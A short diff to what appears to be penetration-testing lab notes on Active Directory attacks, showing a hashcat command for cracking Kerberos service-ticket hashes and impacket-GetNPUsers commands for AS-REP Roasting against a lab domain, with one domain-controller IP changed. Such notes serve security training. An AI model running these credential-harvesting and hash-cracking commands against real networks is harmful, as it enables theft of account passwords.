@@ -21,7 +21,7 @@ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
 # AS-REP Roasting
 
 ```sh
-impacket-GetNPUsers INLANEFREIGHT.LOCAL/ -usersfile users.txt -no-pass -dc-ip 172.16.5.5 -format hashcat -outputfile asrep_hashes.txt
+impacket-GetNPUsers INLANEFREIGHT.LOCAL/ -usersfile users.txt -no-pass -dc-ip 10.10.14.57 -format hashcat -outputfile asrep_hashes.txt
 
 impacket-GetNPUsers INLANEFREIGHT.LOCAL/mholliday -request -dc-ip 172.16.5.5
 ```
